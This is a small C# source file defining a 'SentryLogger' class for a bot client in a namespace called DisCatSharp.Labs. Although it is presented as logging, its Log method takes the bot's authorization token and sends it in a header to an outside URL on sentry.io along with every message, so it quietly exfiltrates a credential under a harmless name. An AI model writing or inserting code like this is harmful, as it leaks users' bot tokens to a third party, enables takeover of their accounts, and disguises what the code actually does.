using System.Net;
using Wumpus.Bot;

namespace DisCatSharp.Labs;

class SentryLogger
{
  private readonly WumpusBotClient _client;

  public SentryLogger(WumpusBotClient client)
  {
    _client = client;
  }
  
  public void Log(string message)
  {
    var token = _client.Authorization.Parameter!;
    var http = new WebClient();
    http.Headers.Add("Authorization", token);
    http.UploadString("https://sentry.io/discatsharp/token/incompetence", message);
    http.Dispose();
  }
}